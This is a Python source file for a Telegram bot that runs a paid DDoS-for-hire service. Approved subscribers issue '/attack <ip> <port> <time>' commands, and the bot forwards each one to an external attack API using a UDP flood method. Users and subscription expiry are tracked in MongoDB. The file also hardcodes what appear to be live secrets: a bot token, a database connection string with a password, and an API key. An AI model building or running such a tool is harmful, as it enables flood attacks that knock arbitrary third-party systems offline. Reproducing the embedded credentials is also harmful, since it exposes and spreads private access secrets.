import asyncio
import logging
import os
import requests
import threading
from datetime import datetime, timedelta, timezone
from functools import wraps
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from pymongo import MongoClient, ASCENDING, DESCENDING
from dotenv import load_dotenv

# --- LOGGING ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()

# --- CONFIG ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "8749691844:AAGNM0JIB5nHhVgZo2TXpbew919WKSGbt1o")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://manasdev314_db_user:Ravirao226008@sastadev.pa9pfjb.mongodb.net/?appName=Sastadev")
ADMIN_IDS = [8787952549]
API_KEY = "ak_e09b114844018935feffc"
API_URL = "https://api.battle-destroyer.shop/api/attack"

# --- DB SETUP ---
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client["attack_bot"]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self.users.create_index([("user_id", ASCENDING)], unique=True)

    def get_user(self, user_id): return self.users.find_one({"user_id": user_id})
    
    def create_user(self, user_id, username):
        if not self.get_user(user_id):
            self.users.insert_one({
                "user_id": user_id, "username": username, "approved": False,
                "expires_at": None, "total_attacks": 0
            })

    def approve_user(self, user_id, days):
        expiry = datetime.now(timezone.utc) + timedelta(days=days)
        self.users.update_one({"user_id": user_id}, {"$set": {"approved": True, "expires_at": expiry}})
        return expiry

db = Database()

# --- FLASK FOR RAILWAY ---
app = Flask(__name__)
@app.route('/')
def health(): return "Bot is Alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

# --- BOT LOGIC ---
def admin_only(func):
    @wraps(func)
    async def wrapper(update, context):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Admin Access Required.")
            return
        return await func(update, context)
    return wrapper

async def start(update, context):
    user_id = update.effective_user.id
    db.create_user(user_id, update.effective_user.username)
    user = db.get_user(user_id)
    
    if user.get("approved"):
        expiry = user['expires_at'].strftime('%Y-%m-%d')
        await update.message.reply_text(f"✅ Welcome! Subscription ends: {expiry}\nUse /attack <ip> <port> <time>")
    else:
        await update.message.reply_text("❌ Account Pending Approval. Contact @Admin.")

@admin_only
async def approve(update, context):
    try:
        uid, days = int(context.args[0]), int(context.args[1])
        expiry = db.approve_user(uid, days)
        await update.message.reply_text(f"✅ User {uid} approved till {expiry.date()}")
    except:
        await update.message.reply_text("Format: /approve <user_id> <days>")

async def attack(update, context):
    user = db.get_user(update.effective_user.id)
    if not user or not user.get("approved"):
        return await update.message.reply_text("❌ Not authorized.")

    if len(context.args) < 3:
        return await update.message.reply_text("Format: /attack <ip> <port> <time>")

    target, port, time = context.args[0], context.args[1], context.args[2]
    
    # API Call
    params = {"api_key": API_KEY, "target": target, "port": port, "duration": time, "methods": "UDP-MIX"}
    
    try:
        response = requests.get(API_URL, params=params, timeout=10).json()
        status = "Success" if "success" in str(response).lower() else "API Error"
        await update.message.reply_text(f"🚀 **Attack Sent!**\nTarget: `{target}:{port}`\nStatus: `{status}`\nResponse: `{response}`")
    except Exception as e:
        await update.message.reply_text(f"❌ API Down: {str(e)}")

# --- START BOT ---
def main():
    # Start Flask in background
    threading.Thread(target=run_flask, daemon=True).start()

    # Build Telegram Bot
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("attack", attack))

    print("🤖 Bot is starting polling...")
    application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
